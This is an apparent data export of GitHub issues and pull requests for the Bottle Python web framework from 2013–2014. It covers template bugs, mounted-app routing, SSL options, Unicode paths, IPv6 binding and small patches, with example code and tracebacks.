595,If expressions broken in STPL after upgrading,2014-03-04T19:06:02Z,2014-03-06T17:32:17Z,Bug,,,"The following code gives a syntax error:

```
% n = 1
% m = '1 review' if n == 1 else '{} reviews'.format(n)
```
"
594,Add SSL support for tornado,2014-03-04T07:43:19Z,2014-10-22T20:56:03Z,,,,"A minor change to allow for running tornado servers with SSL support.
"
593,0.12.1 introduced backward-incompatible change,2014-03-03T14:44:58Z,,,,,"See https://github.com/defnull/bottle/commit/27760afc75bb861d3f360e710b3e9b596715b033#diff-ad8cb2f640fd3a70db3fc97f3044a4e6R1679
"
592,gunicorn ssl_version param?,2014-02-25T17:14:30Z,2014-03-21T19:11:33Z,,,,"Hi,
I am using bottle,  I want to give the ssL_version to  the embedded gunicorn class of bottle
I tested
'''
import ssl
run(server='gunicorn', workers=4,worker_class='gevent',host='0.0.0.0', port=443, debug=debugoption, keyfile='ca.key', certfile='ca.cer', ssl_version=ssl.PROTOCOL_SSLv3)
'''
any other param is ok except ""ssl_version""
could anybody help me?

Thanks.
"
591,Native Session support,2014-02-22T13:08:13Z,,,,,"As beaker is no longer maintained there might be a need for native session support with files.

This can be made in one class which should not take a lot of space in the module.
I can supply a not so working one (had problems with concurrency when using gevent for example)...
This is only feature which should be in bottle as currently it requires a dance with the wolves to set up correctly and beaker is still buggy as hell.
"
590,"Mounted application, wrong template lookup path",2014-02-17T09:30:12Z,,,Error,Error: 500 Internal Server Error,"When using templates within a mounted application, the mounted application templates lookup path is relative to the root application (mentionned [here](http://comments.gmane.org/gmane.comp.python.bottle.general/1166) and [here](http://blog.bottlepy.org/2012/07/20/template-search-path-workaround.html)).

Running the code below outputs the following error:

```
Error: 500 Internal Server Error
Sorry, the requested URL 'http://localhost:8000/mounted/' caused an error:
Template 'home' not found.
```
### Problem

When placing `mounted/home.tpl` in the root application directory, everything works well - which is not what is expected.
### Test case

bottle project files structure:

```
.
├── bottle.py (bottle library)
├── mounted
│   ├── home.tpl
│   ├── __init__.py (empty file)
│   ├── mounted_app.py
└── root_app.py
```

root_app.py:

```
import bottle
import mounted

root_app = bottle.app()
root_app.mount(""/mounted"", bottle.load_app('mounted.mounted_app:app'))

if __name__ == '__main__':
    bottle.run(root_app, host='0.0.0.0', port=8000, reloader=True, debug=True)
```

mounted/mounted_app.py:

```
import bottle

app = bottle.app()

@app.route('/')
@bottle.view('home')
def home():
    return {}
```

mounted/home.tpl:

```
Hello world
```
### Solution

Expected behavior: the mounted app template lookup must be relative to the mounted app directory.

Could you give me a short rationale on this, and give me an entry point for a workaround, or better for creating a patch ?
## 

Thank you
"
589,issue 585 reopen,2014-02-12T14:54:24Z,,,,,"please take a look at https://github.com/defnull/bottle/pull/585
"
588,`ConfigDict` namespaces break route options,2014-02-12T12:37:07Z,2014-02-19T21:29:25Z,,,,"`bottle-sqlalchemy` use route based configurations.

`@route(..., sqlalchemy=dict(create=True))`

Before `ConfigDict`, I configured this route (via `apply` plugin API) with `create = route.config.get('sqlalchemy', {}).get('create')`, but now I can access it only with `route.config.get('sqlalchemy.create')`.

I can fix that, but `ConfigDict` wasn't supposed to break things.
"
587,Fix for Issue #586,2014-02-12T01:16:13Z,2014-02-12T17:46:20Z,,,,"Added @functools.wraps(func) to allow for introspection with auth_basic(). Fix for Issue #586.
"
586,The auth_basic() decorator doesn't use functools.wraps().,2014-02-12T00:25:22Z,2014-02-13T00:26:22Z,,,,"The implementation is:

```
def auth_basic(check, realm=""private"", text=""Access denied""):
    ''' Callback decorator to require HTTP auth (basic).
        TODO: Add route(check_auth=...) parameter. '''
    def decorator(func):
        def wrapper(*a, **ka):
            user, password = request.auth or (None, None)
            if user is None or not check(user, password):
                err = HTTPError(401, text)
                err.add_header('WWW-Authenticate', 'Basic realm=""%s""' % realm)
                return err
            return func(*a, **ka)
        return wrapper
    return decorator
```

It doesn't use functools.wraps() on the nested wrapper function, which will stuff up name introspection for any functions which the decorator is applied to.

We have seen this affecting data reported by customers applications into New Relic. We are going to change our instrumentation to fix up the bottle code if we see it is wrong, but you should look at fixing it all the same.
"
585,*monkey patch update_wrapper to add __wrapped__ attribute for versions of...,2014-02-11T12:41:45Z,2014-02-12T14:50:34Z,,,,"python < 3.2.
*updated get_undecorated_callback to use **wrapped**
*updated sqlite plugin to use get_undecorated_callback
"
584,Minor fixes to reduce the amount of warnings,2014-02-08T07:12:45Z,2014-10-22T21:43:22Z,,,,"- Close the file after reading so no more ResourceWarnings in py3.
- When testing mime types, the **file** could be a .pyc in py2.
"
583,"Consistent README, year 2014",2014-02-08T02:55:38Z,2014-02-08T23:02:22Z,,,,"README.rst was looking weird and old in comparison to the website, so I just thought it needed an update. Plus, we are in 2014 now, happy new year!
"
582,Lowercasing in FileUpload.filename,2014-02-06T05:13:55Z,,,,,"pycurl tests broke on travis recently (https://travis-ci.org/pycurl/pycurl/builds/18246021). I tracked the breakage down to b18a938b220a7a8120a5e2aebc5745b which makes filename attribute of file uploads be all lowercase. I reproduced the breakage on my debian jessie system as well. I'm guessing travis/pypi just upgraded from bottle 0.11 to 0.12.

While I agree with unicode normalization and path separator removal as security features, benefits of case conversion are not as clear. Suppose I rely on the fact that bottle lowercases file names and don't lowercase them in my application, and subsequently assume that names of files _on the filesystem_ are all lowercased. What if a user renamed some files outside of my application to have mixed case? Now my application would have a potential security hole. If I cared for security I would perform case insensitive comparisons (everywhere) rather than relying on file names being in a particular case anywhere, be that file system or library output.

If I was on unix, I would want to receive files in the correct case. If I was writing an application where file names were meaningful, I would have to forego using `filename` entirely and instead perform my own normalization and path separator etc. filtering, i.e., by copy pasting `filename` implementation sans the lowercasing.

Finally lowercasing is a behavior change from 0.11 to 0.12. Despite being in the tree for a year apparently this change is only now trickling to production systems. Of course, changing code back to not lowercase is a behavior change as well.

I hope that you consider leaving the case alone in `filename`.
"
581,Mounted applications are shadowed by other routes.,2014-02-05T19:28:25Z,2014-02-05T22:06:37Z,,,,"This code does not behave as expected:

```
app = Bottle()
app.mount('/subapp', sub.app)

@app.get('/<path:path>')
def getfile(path):
    ...
```

The mounted application is shadowed by the getfile-route regardless of the order of declaration. (via IRC/carbon)
"
580,static_file() throws away response headers,2014-02-05T02:47:20Z,,,,,"Trying to figure out why this toy code wasn't working:

```
@app.route('/')
def get_basic_file():
        response.set_cookie('basic_cookie', 1)
    return static_file('index.html', 'path')
```

It seems the static_file() method never looks at the original response object.
"
579,Handle whitespace control over templates using Windows end of line marker,2014-02-04T14:39:04Z,2014-02-04T15:03:53Z,,,,"Fixes issue #578
"
578,Whitespace control is not properly applied to tamplates saved using Windows end of line marker,2014-02-04T14:17:32Z,2014-02-04T17:56:04Z,,,,"If a template is saved using Windows end of line marker, using \r\n instead of \n, the whitespace control is not properly handled.

Using such template:

```
<div>\\
%if True:
<span>content</span>\\
%end
</div>
```

If the file has Windows EOL format (\r\n) the output is parsed:

```
<div>\\
<span>content</span>\\
</div>
```

Using a Unix EOL format (\n) the output is rendered like:

```
<div><span>content</span></div>
```

Please allow the template encoding in Windows EOL format by applying a double check in the flush_text function.
"
576,"Correct docs: static_file returns a 403 on permission errors, not a 401",2014-02-01T21:42:34Z,2014-02-02T14:37:24Z,,,,
575,typing error in html_quote util funcion,2014-01-30T11:43:43Z,2014-02-04T17:56:36Z,,,,"html_quote(string) has return code:

<pre>return '""%s""' % html_escape(string).replace('\n','%#10;')\
                    .replace('\r','&amp;#13;').replace('\t','&amp;#9;')
</pre>

I think '%' character should acutally be '&' character, so return code is:

<pre>return '""%s""' % html_escape(string).replace('\n','&amp;#10;')\
                    .replace('\r','&amp;#13;').replace('\t','&amp;#9;')
</pre>
"
574,Allow custom bind_addr for CherryPy,2014-01-29T07:36:34Z,2017-03-25T18:13:33Z,,,,"This is useful for listening on a unix socket, for running behind a reverse proxy.
"
573,HttpResponse can contain headers with newlines,2014-01-28T13:55:30Z,2016-12-21T10:29:35Z,,,,"HttpResponse does not check for newlines in the supplied headers. This implies some security issues, namely possibility of CRLF injection/response splitting when unsanitized user input is used as value of Location or Set-Cookie header. This should be fixed on framework-level, IMO.

See: http://www.securiteam.com/securityreviews/5WP0E2KFGK.html
"
572,GET and POST variable and utf8 issue,2014-01-25T23:55:02Z,2014-01-26T15:40:01Z,,,,"I found the code in test/test_environ.py

```
    self.assertEqual(tonat(tob('瓶'), 'latin1'), request.POST['cn'])
    self.assertEqual(touni('瓶'), request.POST.cn)
```

Is it different to use POST.xx and POST['xx']?

Can it just return '瓶'?
"
571,Multi-phase run for WSGIRefServer,2014-01-21T09:49:46Z,,,,,"This is an initial stab at addressing issue #568. It's certainly not a complete solution, and it only works for the WSGIRefServer. What I'd like, if you have time, is some feedback on the approach. 

The basic idea is that I've separated the initialization of ServerAdapters from running them. This lets users optionally access the server before it starts serving, meaning that they can e.g. find the port that's been selected for them.

There are certainly other ways we could approach this, so if you'd prefer a different implementation I'd be more than happy to try it. This is a problem I'd like to see solved.
"
570,Use gevent.sleep instead of time.sleep,2014-01-19T10:55:18Z,2014-02-07T12:48:00Z,,,,"Use gevent.sleep instead of time.sleep to prevent blocking (just to educate the users not to use sleep):

http://stackoverflow.com/questions/12040880/how-to-avoid-blocking-code-in-python-with-gevent
"
569,"""attribues"" typo fixes in docstrings",2014-01-16T04:55:25Z,2014-01-16T14:25:35Z,,,,
568,Provide access to selected port when port==0,2014-01-14T09:16:27Z,,,,,"Currently I don't see any way to determine which port is being used by the server when I ask bottle to use ""any available port"" i.e. by passing port=0. On the one hand, selecting any open port is a great feature, but it's made largely useless by hiding the selected port. I'd really like to be able to find out which has been selected.

I imagine that this will require some new API, for example some ability to first provision the server before asking it to run. Otherwise the blocking server.run() call would prevent me from asking the server which port it selected. But I imagine that you could maintain the existing API while augmenting it with some new code.

Looking at the code, it looks like you could update the ServerAdapter concept to support both its current run() method along with something a bit more open, perhaps an initialize()/run() combo. I've just made a cursory scan of the code, so maybe I'm way off base here, but in any event it doesn't look like an intractable problem. I suppose also that this functionality might not be supportable by all backends, but it would be nice if you supported it for those that do.
"
567,In python 3.4 multipart file upload breaks due to change in cgi.FieldStorage,2014-01-11T23:27:02Z,2014-04-29T17:26:09Z,,ValueError,ValueError: I/O operation on closed file.,"In Python 3.4, the `cgi.FileStorage` class now has a `__del__` method that close the file objects.

`BaseRequest.POST()` uses that class to parse multipart requests and then grabs the files directly into `FileUpload` instances. When the function exits, the variable data is garbage collected and the `__del__` method is called, closing the file handle held in the returned `post` dictionary.

Unit test `test_environ.test_multipart()` catches this because it tries to access the file object and `read()`s it which fails with this exception:

```
ValueError: I/O operation on closed file.
```

This doesn't happen in python 3.3.3.

I'm not sure the best way to go around fixing this. Perhaps stashing the `cgi.FileStorage` instance in the return `post` dictionary? That would fix the dereference but it's ugly:

```
diff --git a/bottle.py b/bottle.py
index 9ab7b3d..edae3b5 100644
--- a/bottle.py
+++ b/bottle.py
@@ -1221,6 +1221,7 @@ class BaseRequest(object):
             if item.filename:
                 post[item.name] = FileUpload(item.file, item.name,
                                              item.filename, item.headers)
+                post.__FieldStorage = data
             else:
                 post[item.name] = item.value
         return post
```
"
566,Fixed path being unshifted before returned generator exhausted.,2013-12-19T22:55:27Z,2016-08-29T16:52:23Z,,,,"I've experienced some request issues on long generator routes, mainly related to SCRIPT_NAME and PATH_INFO changing between yields.
After some debugging I've realized path_shift was being called before yielding, breaking all get_url calls on my partial templates from my mounted app.
This patch fixes that chaining the path_shift to response body, instead of calling right after return.
"
565,Two repo for this project?,2013-12-07T22:08:44Z,2014-12-08T18:00:01Z,,,,"https://github.com/bottlepy/bottle
and
https://github.com/defnull/bottle

Go to unification repo?

https://github.com/bottlepy/bottle/issues/11
"
564,The utf-8 problem,2013-12-04T08:42:00Z,2013-12-04T09:30:15Z,,,,"I found the FieldStorage's filename (file uploading)is incorrect because the FieldStorage is not created by utf-8 encoding. If the filename contains non-ascii character. I must encode the filename by ISO-8859-1 and decode it by utf-8 to make it get right.
"
563,Rendering none values as empty strings for #562,2013-12-03T17:30:10Z,2013-12-03T22:20:24Z,,,,"I am not sure if this breaks anything but in my test environment it works fine. For issue #562 
"
562,"Simple template renders None values as string ""None""",2013-12-03T17:17:43Z,2013-12-04T09:34:40Z,,,,"When using simple template, rendering None values results as a string which is ""None"", instead of this shouldn't it render an empty string ?

This behavior makes, need of additional code in form processing.
"
561,calling str() from a template file raises an exception,2013-11-20T12:31:04Z,2013-11-20T19:45:38Z,,,,"this simple code `<td>{{str(123)}}</td>` result in a error `TypeError: '_sre.SRE_Match' object is not callable`

using Bottle v0.11.6
"
560,static_file is broken in python3.3,2013-11-16T08:11:18Z,2013-12-03T16:52:57Z,,,,"Trying to reproduce my problem.
1. touch /static/中文.txt
2. write some codes

``` python
@route('/static/<path:path>')
def callback(path):
       return static_file(path, root=""static"", download=True)
run()
```

then I point chrome to http://127.0.0.1:8080/static/中文.txt

My problem is.
1. If those codes are running under Python2.x, chrome can download 中文.txt as normal.
2. If those codes are running under Python3.3, chrome will get a 404 response.

I'm using Linux, and trying to fix this problem on my own.
Any guidance will be appreciated :)

More works need to be done if I want to get rid of 404 response in win.
As filename in URL is utf8 encoded, and win's sys.filesystemencoding() is mbcs.
"
559,remove confusing default arg in index page,2013-11-15T14:06:44Z,2013-12-03T16:48:25Z,,,,", since request to localhost:8080/hello/ returns 404
"
558,JSONPlugin also handles a list as return type,2013-10-26T18:31:19Z,2013-10-28T15:39:16Z,,,,"A list is also a valid basis for a JSON serialization. Therefore the JSONPlugin should also handle lists for return types.
"
557,Add support for chunked requests,2013-10-23T12:10:06Z,2013-11-01T17:43:30Z,,,,"This patch adds support for dealing with chunked POST and PUT requests. A chunked body contains sets of chunks as follows:

<length of 1. chunk in hex>'\r\n'
<chunk data>'\r\n'
<length of 2. chunk in hex>'\r\n'
<chunk data>'\r\n'
...
<length of n. chunk in hex>'\r\n'
<chunk data>'\r\n'
'0\r\n'
'\r\n'
"
556,Mounted app and get_url(),2013-10-13T12:58:32Z,2014-02-17T11:04:17Z,,,,"### Problem

`get_url()` doesn't take the prefix of mounted applications into account:

Mounting `bar` into `foo` gives no way to _get the urls of the mounted app_ using `get_url()`:
- `app.get_url('/bar')`: RouteBuildError: ('No route with that name.', '/bar')<br>
  **rationale:** the _bar app_ urls are unknown to the _foo app_
- `bar.app.get_url('/bar')` /bar<br>
  **rationale:** the _bar app_ doesn't know it was mounted into _foo app_
### Example

**foo.py (root app):**

``` python
import bottle
import bar

app = bottle.default_app()

@app.route(""/"")
def index():
    return ""hello foo""

import bar
app.mount(""/bar"", bar.app)

if __name__ == ""__main__"":
    bottle.run(host=""localhost"", port=8080, reloader=True)
```

**bar.py (mounted app):**

```
import bottle

app = bottle.Bottle()

@app.route(""/"")
def index():
    return ""hello bar""
```

Anybody got something on this issue?
"
555,Fixed an error in tutorial file,2013-10-02T14:58:11Z,2013-10-18T14:55:24Z,,,,"Fixed an error in tutorial file
"
554,Fix static route rule in tutorial,2013-10-02T13:03:11Z,2013-10-18T14:54:19Z,,,,"It was reported in googlegroups.

https://groups.google.com/d/msg/bottlepy/p9jBFK8DogM/7sOT8hqlke0J
"
553,zh-CN doc typo,2013-09-30T14:24:10Z,2013-10-18T14:55:44Z,,,,"hi,
I find a typo when I read zh-CN docs.  `经常`(means often) -> `线程`(means thread).  But I think that it does not cause any big misunderstanding. ：）
"
552,"if chinese directory path,SimpleTemplate Faied.",2013-09-29T14:13:27Z,,,UnicodeDecodeError,UnicodeDecodeError: 'ascii' codec can't decode byte 0xe4 in position 17: ordinal not in range(128),"directory path contain any chinese word,when launch the bottle server.
it's crushed. Error: 500 Internal Server Error

this directory views:

```
中文
  ├── bottle.py    latest version
  ├── test.py
  └── views
     ├── foot.tpl
     └── home.tpl
```

== test.py ==

```
#!/usr/bin/env python2
#coding: utf8
from bottle import get,run,template
@get(""/"")
def test():
    return template(""home"")
if __name__==""__main__"":
    host='127.0.0.1'
    port=8080
    run(host=host,port=port)
```

== home.tpl  ==

```
<!doctype html>
<html>
    <head>  
        <meta charset=""utf-8"">
        <title>test Chinese dir path</title>
    </head>
    <body>
        test chinese path!
        %include foot
    </body>
</html>
```

== foot.tpl  ==

```
<p>we @ foot</p>
```

== error msg ==

```
Traceback (most recent call last):
  File ""/home/david/test/中文/bottle.py"", line 861, in _handle
    return route.call(**args)
  File ""/home/david/test/中文/bottle.py"", line 1725, in wrapper
    rv = callback(*a, **ka)
  File ""./test.py"", line 7, in test
    return template(""home"")
  File ""/home/david/test/中文/bottle.py"", line 3465, in template
    return TEMPLATES[tplid].render(kwargs)
  File ""/home/david/test/中文/bottle.py"", line 3273, in render
    self.execute(stdout, env)
  File ""/home/david/test/中文/bottle.py"", line 3260, in execute
    eval(self.co, env)
  File ""/home/david/test/中文/views/home.tpl"", line 9, in <module>
    %include foot
  File ""/home/david/test/中文/bottle.py"", line 3249, in _include
    self.cache[_name] = self.__class__(name=_name, lookup=self.lookup)
  File ""/home/david/test/中文/bottle.py"", line 3088, in __init__
    self.filename = self.search(self.name, self.lookup)
  File ""/home/david/test/中文/bottle.py"", line 3109, in search
    fname = os.path.abspath(os.path.join(spath, name))
  File ""/home/david/.pythonbrew/pythons/Python-2.7.3/lib/python2.7/posixpath.py"", line 69, in join
    path +=  b
UnicodeDecodeError: 'ascii' codec can't decode byte 0xe4 in position 17: ordinal not in range(128)
```

=== solution? ===
i change the line 3088

```
  self.filename = self.search(self.name, self.lookup)
```

to:

```
  self.filename = self.search(tob(self.name,encoding), self.lookup)
```

Looks fixed.

test case @: https://www.dropbox.com/s/njf0un7i96aqjhv/chinesepath.tar.gz
"
551,Edit JSONPlugin class so that list objects are automatically encoded as JSON,2013-09-27T05:08:18Z,2013-10-18T15:21:51Z,,,,"Hi Marcel, I've been using bottle for about a year now and love it, but wanted to suggest this change, as it's an issue I've run into several times:

Having a list as the root element of a JSON document is perfectly valid. The auto-decoding of JSON documents with lists at the root works just fine; this fix allows bottle to also automatically encode list objects to JSON.

(Also, this is my first time using GitHub's Pull Request feature, and I'm relatively new to Git also, so if I'm doing something wrong, please be gentle!)
"
550,Added reloader support to GeventServer,2013-09-14T04:20:42Z,2013-10-18T15:41:25Z,,,,"This is a potential solution to issue #549.
"
549,GeventServer does not work when reloader=True,2013-09-14T04:17:50Z,2013-12-03T16:56:40Z,,,,"Gevent will catch any signals resulting in a KeyboardInterrupt and prevent the process from exiting. This also prevents Bottle's reloader from working.

One solution to this is to have Bottle register a signal handler for SIGINT, bypassing any Gevent handling in the case that reloader=True, when it should be safe to assume the developer is debugging and is not intending to handle the KeyboardInterrupt himself. A pull request implementing this solution should follow shortly.
"
548,BaseRequest MAX_PARAMS attribute can be overriden by ConfigDict,2013-09-07T11:13:37Z,2013-10-18T15:26:25Z,,,,"I have complex admin interface, and BaseRequest attribute MAX_PARAMS default value of 100 is not enough. Please consider merging my pull request, now it is possible to specify limit in ConfigDict. Thanks!
"
547,modified the cherrypy adapter to support ssl options,2013-09-06T02:24:29Z,2013-10-18T15:26:46Z,,,,"With this modification passing the keyword args ""certfile"" and ""keyfile"" to the bottle.run will enable ssl when cherrypy is the server option. 
"
546,@post('/login') won't work,2013-09-05T17:36:36Z,2013-12-03T16:59:16Z,,,,"hello. when i'm adding `@post('/login')` it will throw me an error and it won't work. `@route('/login', method='POST')` will work just fine thought. it only occurs with `@post`. `@get` works normally.

python version: 3.4
bottle version: 0.12-dev

log:

```
[Thu Sep 05 20:25:00 2013] [error] [client 127.0.0.1] Premature end of script headers: index.py, referer: http://localhost/bottle/user
[Thu Sep 05 20:25:00 2013] [error] [client 127.0.0.1] Traceback (most recent call last):\r, referer: http://localhost/bottle/user
[Thu Sep 05 20:25:00 2013] [error] [client 127.0.0.1]   File ""C:/AppServ/www/bottle/index.py"", line 86, in <module>\r, referer: http://localhost/bottle/user
[Thu Sep 05 20:25:00 2013] [error] [client 127.0.0.1]     @post('/user')\r, referer: http://localhost/bottle/user
[Thu Sep 05 20:25:00 2013] [error] [client 127.0.0.1]   File ""C:/AppServ/www/bottle/index.py"", line 55, in post\r, referer: http://localhost/bottle/user
[Thu Sep 05 20:25:00 2013] [error] [client 127.0.0.1]     else: abort(404)\r, referer: http://localhost/bottle/user
[Thu Sep 05 20:25:00 2013] [error] [client 127.0.0.1]   File ""C:\\Python34\\lib\\bottle.py"", line 2313, in abort\r, referer: http://localhost/bottle/user
[Thu Sep 05 20:25:00 2013] [error] [client 127.0.0.1]     raise HTTPError(code, text)\r, referer: http://localhost/bottle/user
[Thu Sep 05 20:25:00 2013] [error] [client 127.0.0.1] bottle.HTTPError: (404, 'Unknown Error: Application stopped.')\r, referer: http://localhost/bottle/user
```
"
545,Running bottle as CGI error,2013-09-05T00:38:41Z,2013-09-05T17:32:13Z,,,,"When I'm trying to run bottle as cgi I get an error. I'm using python 3.4.

[here's the output log](http://pastebin.com/V2KxqwNY)

edit: seems like it occurs only when i'm trying to run it on the terminal. when i'm using apache it displays the page right.
"
544,Changing bottle to accept options for cherrypy server like numofthreads ...,2013-08-20T22:37:02Z,2013-08-25T13:52:32Z,,,,"Changing bottle run to accept options for cherrypy server like numofthreads and other options that are needed for cherrypy wsgiserver configuration.

For example in the example below i am specifying the number of threads to be created at startup by cherrypy as a options dictionary.

 run( APP, host = CONFIG.get( webserver, hostname ), port = CONFIG.get( webserver, port ),
         server = cherrypy, debug = CONFIG.get( webserver, debug ), options = {numthreads:30} )
"
543,Hooks aren't firing for merged applications,2013-08-19T23:38:02Z,,,,,"0.12 latest commit 0f8b8995c1c5ec104c7b983d478ccff088032e82

It's working the other way for 0.11: only hooks from merged application are firing, nothing for main application. 

Test example:
1) open http://localhost:9999/admin/page.
2) uncomment `admin.run` and comment out `main_app.run`, F5 - you will be redirected to login (it's the right behaviour).

``` python

from bottle import Bottle, request, redirect

# MAIN APPLICATION

main_app = Bottle()

@main_app.get('/')
def home():
    return 'Home'

# ADMIN

def login_required():
    # get admin user from cookie
    admin = False
    if not admin and request.path != LOGIN_PAGE:
        return redirect(LOGIN_PAGE)

admin = Bottle()
admin.add_hook('before_request', login_required)

LOGIN_PAGE = '/admin/login'

@admin.get('/admin/page')
def admin_page():
    return ""For admin user only""

@admin.get('/admin/login')
def login():
    return ""Login form""

# merge applications
main_app.merge(admin)

#admin.run(debug=True, reloader=True, host='127.0.0.1', port=9999)
main_app.run(debug=True, reloader=True, host='127.0.0.1', port=9999)
```
"
542,add Chinese translation of configuration,2013-08-09T10:54:19Z,2013-08-25T13:52:54Z,,,,"Now, I failed to generate a pdf of this translation. Maybe I should change the settings in conf.py?
"
541,ipv6 support missing :(,2013-08-08T09:01:42Z,2013-08-25T14:52:17Z,,socket.gaierror,socket.gaierror: [Errno -9] Address family for hostname not supported,"Traceback (most recent call last):
  File ""my-server.py"", line 11, in <module>
    run(host='2001:0:53aa:64c:4cc:103e:a68b:dfc2', port=8080)
  File ""/home/warend/bottle/bottle.py"", line 2963, in run
    server.run(app)
  File ""/home/warend/bottle/bottle.py"", line 2644, in run
    srv = make_server(self.host, self.port, handler, *_self.options)
  File ""/usr/lib/python2.7/wsgiref/simple_server.py"", line 144, in make_server
    server = server_class((host, port), handler_class)
  File ""/usr/lib/python2.7/SocketServer.py"", line 419, in **init**
    self.server_bind()
  File ""/usr/lib/python2.7/wsgiref/simple_server.py"", line 48, in server_bind
    HTTPServer.server_bind(self)
  File ""/usr/lib/python2.7/BaseHTTPServer.py"", line 108, in server_bind
    SocketServer.TCPServer.server_bind(self)
  File ""/usr/lib/python2.7/SocketServer.py"", line 430, in server_bind
    self.socket.bind(self.server_address)
  File ""/usr/lib/python2.7/socket.py"", line 224, in meth
    return getattr(self._sock,name)(_args)
socket.gaierror: [Errno -9] Address family for hostname not supported
"
540,Don't use super() for old-style classes,2013-08-07T00:14:23Z,2013-08-25T13:51:34Z,,TypeError,"TypeError: must be type, not classobj","`super()` is for new-style classes only.
See http://docs.python.org/2/library/functions.html#super

Unpatched, the following exception is thrown on each request. After patching, requests are logged without throwing exceptions.

Note that other instances of `super()` may need to be replaced as well. I didn't check the others.

```
----------------------------------------
Exception happened during processing of request from ('127.0.0.1', 48746)
Traceback (most recent call last):
  File ""/usr/lib/python2.7/SocketServer.py"", line 295, in _handle_request_noblock
    self.process_request(request, client_address)
  File ""/usr/lib/python2.7/SocketServer.py"", line 321, in process_request
    self.finish_request(request, client_address)
  File ""/usr/lib/python2.7/SocketServer.py"", line 334, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File ""/usr/lib/python2.7/SocketServer.py"", line 649, in __init__
    self.handle()
  File ""/usr/lib/python2.7/wsgiref/simple_server.py"", line 124, in handle
    handler.run(self.server.get_app())
  File ""/usr/lib/python2.7/wsgiref/handlers.py"", line 92, in run
    self.close()
  File ""/usr/lib/python2.7/wsgiref/simple_server.py"", line 33, in close
    self.status.split(' ',1)[0], self.bytes_sent
  File ""/home/tylerl/bottle/bottle.py"", line 2645, in log_request
    return super(FixedHandler, self).log_request(*args, **kw)
TypeError: must be type, not classobj
----------------------------------------
```
"
539,lookup callable: allows e.g. <template>/de.tpl or modify BaseTemplate.de...,2013-07-30T18:47:20Z,,,,,"...faults per included template or stop an infinite include recursion
"
538,typo back instead of brack,2013-07-30T18:24:43Z,2013-08-25T13:53:40Z,,,,
537,static_files accepting cross-domain header,2013-07-30T13:28:04Z,2013-07-30T15:50:49Z,,,,"Hello,

I have a need that my static files should work cross-domain. For that, need to insert a header on the request. I made it work on the production environment using nginx to return with the header, however we are struggling with it on our developers machines.

In my opinion, there is no downside in allowing it on the static_files function. Isn't it possible to add the flag ""crossdomain"" in the function and add the ""Access-Control-Allow-Origin"" header to the return?

Thank you
"
536,docs: link fixes,2013-07-29T10:56:46Z,2013-08-25T13:54:01Z,,,,"Fixed a broken link.

Changed the Jinja2 link, to point to the website and not the documentation.  This is consistent with the links to mako and cheetah.
"
535,%include() doesn't work.,2013-07-28T09:59:32Z,2013-08-26T21:18:35Z,,TypeError,TypeError: _include() takes exactly 3 arguments (2 given),"In reference to #522, if I try to use `include()` in a template as outlined in [your recent blog post](http://blog.bottlepy.org/2013/07/19/preview-bottle-012.html), this is what happens:

<pre>
  File ""/Users/rcarmo/Dropbox/Development/github/yaki-tng/lib/bottle.py"", line 3445, in wrapper
    return template(tpl_name, **tplvars)
  File ""/Users/rcarmo/Dropbox/Development/github/yaki-tng/lib/bottle.py"", line 3421, in template
    return TEMPLATES[tplid].render(kwargs)
  File ""/Users/rcarmo/Dropbox/Development/github/yaki-tng/lib/bottle.py"", line 3235, in render
    self.execute(stdout, env)
  File ""/Users/rcarmo/Dropbox/Development/github/yaki-tng/lib/bottle.py"", line 3227, in execute
    return self._include(env, subtpl, **rargs)
  File ""/Users/rcarmo/Dropbox/Development/github/yaki-tng/lib/bottle.py"", line 3212, in _include
    return self.cache[_name].execute(env['_stdout'], env)
  File ""/Users/rcarmo/Dropbox/Development/github/yaki-tng/lib/bottle.py"", line 3222, in execute
    eval(self.co, env)
  File ""/Users/rcarmo/Dropbox/Development/github/yaki-tng/views/layout.tpl"", line 57, in <module>
    %include()
TypeError: _include() takes exactly 3 arguments (2 given)
</pre>
"
534,fixes in docs,2013-07-27T12:23:12Z,2013-07-27T12:53:22Z,,,,"Fixed some namings and made the login examples more consistent.
"
533,docs: eliminate usage of %s,2013-07-26T20:10:03Z,2013-07-28T16:42:42Z,,,,"I made one example slightly more complicated, but documentation should show best practices rather than mislead to vulnerabilities.

Note that the template section says nothing about escaping. In my eyes this is a important feature and should find its way into the tutorial.
"
532,Small fixes,2013-07-26T16:41:21Z,2013-07-26T17:04:28Z,,,,"Small fixes in the documentation.
"
531,Remove deprecated parts from tutorial app code,2013-07-25T22:45:00Z,,,,,"Today we had a complaint about `@validate` function, which was removed from development version.

This tutorial still uses the old route format (`x` instead of `<x>`).
"
530,SimpleTemplate: prevent infinite include recursion and reuse cache for i...,2013-07-25T21:49:14Z,2013-07-28T17:21:08Z,,,,"...nclude
"
529,Added 'fast' option to WSGIRefServer to disable reverse DNS look-ups.,2013-07-20T02:50:53Z,2013-07-28T17:09:49Z,,,,"The default WSGIRefServer implementation performs a reverse DNS look-up for every log entry.  If rDNS is slow or down, this holds up every web serve - possibly as much as by the rDNS time-out of 5 to 10 seconds!

The following patch adds an option to easily disable rDNS look-ups and logging through the run() method, like so:

```
app = bottle.default_app()
bottle.run(host='0.0.0.0', port='80', app=app, fast=True)
```

This has proved very helpful for speeding up page serves for me.  I hope it proves helpful for others.
"
528,Use content type text/plain for older browsers,2013-07-18T21:50:03Z,2013-07-25T03:55:36Z,,,,"Some older browsers, such as IE9, don't handle the application/json content
type very well. They offer their download dialog and expect the user to do
something with it. For browsers that do not claim to handle
application/json, this commit returns a content type of text/plain, which
these browsers do handle transparently.
"
527,Delete duplicated assertEqual,2013-07-17T08:14:15Z,2013-07-17T10:20:03Z,,,,"Duplicated assertEqual in the test function
"
526,url-encoded / is treated as real /,2013-07-15T22:22:48Z,2013-07-16T14:26:43Z,,,,"using something like:

```
@route('/index/<query>', method='GET')
def index(query=''):
```

requesting `/index/foobar` works, the function gets called
however, `/index/foo%2fbar` returns 404 not found. `%2f` is a url-encoded `/`
expected behavior: it calls the `index` function and `query` is set to 'foo/bar'
"
525,Bottle does not listen on IPv6 addresses,2013-07-11T18:34:31Z,2013-10-10T00:52:16Z,,socket.gaierror,socket.gaierror: [Errno -9] Address family for hostname not supported,"Attempting to bind to an IPv6 address or `::` results in the following error:

```
socket.gaierror: [Errno -9] Address family for hostname not supported
```
"
524,Hooks not firing across apps,2013-07-11T10:56:49Z,,,,,"I have a master app and several sub-apps that are merged into the master app using the `Bottle.merge()` method.
